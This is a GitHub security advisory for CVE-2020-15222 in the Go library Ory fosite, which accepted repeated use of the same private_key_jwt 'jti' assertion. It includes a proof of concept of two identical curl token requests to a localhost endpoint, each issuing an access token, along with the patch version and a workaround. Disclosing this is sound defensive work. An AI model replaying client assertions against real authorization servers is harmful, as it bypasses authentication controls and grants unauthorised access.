# [H] Token reuse in Ory fosite

## Summary
Severity: High
Advisory: GHSA-v3q9-2p3m-7g43
CVE: CVE-2020-15222
CWE: CWE-287, CWE-345
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2021-05-24
Source: https://github.com/advisories/GHSA-v3q9-2p3m-7g43
Type: github-advisory

## Affected
- Go: `github.com/ory/fosite` — affected >=0 <0.31.0

## Details
### Impact

When using client authentication method "private_key_jwt" [[1]](https://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication), OpenId specification says the following about assertion `jti`:

> A unique identifier for the token, which can be used to prevent reuse of the token. These tokens MUST only be used once, unless conditions for reuse were negotiated between the parties

Hydra does not seem to check the uniqueness of this `jti` value. Here is me sending the same token request twice, hence with the same `jti` assertion, and getting two access tokens:

```
$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \
   --header 'Content-Type: application/x-www-form-urlencoded' \
   --data-urlencode 'grant_type=client_credentials' \
   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \
   --data-urlencode 'scope=application openid' \
   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
   --data-urlencode 'client_assertion=eyJhb [...] jTw'
{"access_token":"zeG0NoqOtlACl8q5J6A-TIsNegQRRUzqLZaYrQtoBZQ.VR6iUcJQYp3u_j7pwvL7YtPqGhtyQe5OhnBE2KCp5pM","expires_in":3599,"scope":"application openid","token_type":"bearer"}⏎
$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \
   --header 'Content-Type: application/x-www-form-urlencoded' \
   --data-urlencode 'grant_type=client_credentials' \
   --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \
   --data-urlencode 'scope=application openid' \
   --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
   --data-urlencode 'client_assertion=eyJhb [...] jTw'
{"access_token":"wOYtgCLxLXlELORrwZlmeiqqMQ4kRzV-STU2_Sollas.mwlQGCZWXN7G2IoegUe1P0Vw5iGoKrkOzOaplhMSjm4","expires_in":3599,"scope":"application openid","token_type":"bearer"}
```

### Patches

This issue is patched in 0.31.0.

### Workarounds

Do not allow clients to use `private_key_jwt`.

### References

https://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication

## References
- https://github.com/ory/fosite/security/advisories/GHSA-v3q9-2p3m-7g43
- https://nvd.nist.gov/vuln/detail/CVE-2020-15222
- https://github.com/ory/fosite/commit/0c9e0f6d654913ad57c507dd9a36631e1858a3e9
- https://github.com/ory/fosite
- https://github.com/ory/fosite/releases/tag/v0.31.0
- https://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication
- https://pkg.go.dev/vuln/GO-2021-0110
